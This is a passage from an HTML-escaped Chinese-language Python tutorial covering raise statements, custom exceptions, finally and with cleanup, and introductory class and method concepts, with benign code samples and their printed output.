&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;抛出异常&#34;&gt;&lt;a href=&#34;#抛出异常&#34; class=&#34;headerlink&#34; title=&#34;抛出异常&#34;&gt;&lt;/a&gt;抛出异常&lt;/h3&gt;&lt;p&gt; 使用 raise 语句抛出一个指定的异常&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;Exception &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; args &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; traceback&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; Exception&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;x 不能大于 5。x 的值为: {}&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Traceback (most recent call last):
  File xxx in &amp;lt;module&amp;gt;
    raise Exception(&#39;x 不能大于 5。x 的值为: {}&#39;.format(x))
Exception: x 不能大于 5。x 的值为: 10
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; NameError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;HiThere&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; NameError&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;An exception flew by!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Traceback (most recent call last):
  File xxxx in &amp;lt;module&amp;gt;
    raise NameError(&#39;HiThere&#39;)
NameError: HiThere
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;用户自定义异常&#34;&gt;&lt;a href=&#34;#用户自定义异常&#34; class=&#34;headerlink&#34; title=&#34;用户自定义异常&#34;&gt;&lt;/a&gt;用户自定义异常&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyError&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Exception&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; value

    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__str__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; MyError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; MyError &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;My exception occurred, value:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; MyError&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;oops!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Traceback (most recent call last):
  File xxx in &amp;lt;module&amp;gt;
    raise MyError(&#39;oops!&#39;)
__main__.MyError: &#39;oops!&#39;
My exception occurred, value: 4
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;定义清理行为&#34;&gt;&lt;a href=&#34;#定义清理行为&#34; class=&#34;headerlink&#34; title=&#34;定义清理行为&#34;&gt;&lt;/a&gt;定义清理行为&lt;/h3&gt;&lt;p&gt;不管 try 子句里面有没有发生异常，finally 子句都会执行&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;raise&lt;/span&gt; KeyboardInterrupt
&lt;span class=&#34;token keyword&#34;&gt;finally&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Goodbye, world!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
Traceback (most recent call last):
  File xxx in &amp;lt;module&amp;gt;
    raise KeyboardInterrupt
KeyboardInterrupt
Goodbye, world!
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;预定义的清理行为&#34;&gt;&lt;a href=&#34;#预定义的清理行为&#34; class=&#34;headerlink&#34; title=&#34;预定义的清理行为&#34;&gt;&lt;/a&gt;预定义的清理行为&lt;/h3&gt;&lt;p&gt;一些对象定义了标准的清理行为，无论系统是否成功的使用了它，一旦不需要它了，那么这个标准的清理行为就会执行&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;myfile.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上这段代码的问题是，当执行完毕后，文件会保持打开状态，并没有被关闭&lt;/p&gt;
&lt;p&gt;关键词 with 语句就可以保证诸如文件之类的对象在使用完之后一定会正确的执行他的清理方法&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;myfile.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;line&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上这段代码执行完毕后，就算在处理过程中出问题了，文件 f 总是会关闭&lt;/p&gt;
&lt;h2 id=&#34;面向对象&#34;&gt;&lt;a href=&#34;#面向对象&#34; class=&#34;headerlink&#34; title=&#34;面向对象&#34;&gt;&lt;/a&gt;面向对象&lt;/h2&gt;&lt;h3 id=&#34;简介&#34;&gt;&lt;a href=&#34;#简介&#34; class=&#34;headerlink&#34; title=&#34;简介&#34;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;类(Class):&lt;/strong&gt; 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;方法：&lt;/strong&gt;类中定义的函数。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;类变量：&lt;/strong&gt;类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;数据成员：&lt;/strong&gt;类变量或者实例变量用于处理类及其实例对象的相关的数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;方法重写：&lt;/strong&gt;如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;局部变量：&lt;/strong&gt;定义在方法中的变量，只作用于当前实例的类。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实例变量：&lt;/strong&gt;在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;继承：&lt;/strong&gt;即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实例化：&lt;/strong&gt;创建一个类的实例，类的具体对象。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对象：&lt;/strong&gt;通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;类定义&#34;&gt;&lt;a href=&#34;#类定义&#34; class=&#34;headerlink&#34; title=&#34;类定义&#34;&gt;&lt;/a&gt;类定义&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;N&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;类对象&#34;&gt;&lt;a href=&#34;#类对象&#34; class=&#34;headerlink&#34; title=&#34;类对象&#34;&gt;&lt;/a&gt;类对象&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;类对象支持属性引用和实例化&lt;/li&gt;
&lt;li&gt;属性引用格式 obj.name&lt;/li&gt;
&lt;li&gt;类对象创建后，类命名空间中所有的命名都是有效属性名&lt;/li&gt;
&lt;li&gt;类有一个名为 _&lt;em&gt;init&lt;/em&gt;_() 的特殊方法（&lt;strong&gt;构造方法&lt;/strong&gt;），该方法在类实例化时会自动调用&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;MyClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34;一个简单的类实例&#34;&#34;&#34;&lt;/span&gt;
    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;12345&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;hello world&#39;&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 实例化类&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; MyClass&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;token comment&#34;&gt;# 访问类的属性和方法&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;MyClass 类的属性 i 为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;MyClass 类的方法 f 输出为：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
MyClass 类的属性 i 为： 12345
MyClass 类的方法 f 输出为： hello world
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; realpart&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; imagpart&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; realpart
        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; imagpart
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Complex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3.0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;# 输出结果：3.0 -4.5&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;self代表类的实例，而非类&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;prt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__class__&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
 
t &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Test&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
&amp;lt;__main__.Test object at 0x000001A9BBFF6A60&amp;gt;
&amp;lt;class &#39;__main__.Test&#39;&amp;gt;
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;self不是关键字，换成其他的也行&lt;/p&gt;
&lt;h3 id=&#34;类的方法&#34;&gt;&lt;a href=&#34;#类的方法&#34; class=&#34;headerlink&#34; title=&#34;类的方法&#34;&gt;&lt;/a&gt;类的方法&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;使用def关键字来定义一个方法&lt;/li&gt;
&lt;li&gt;必须包含参数self并且为第一个&lt;/li&gt;
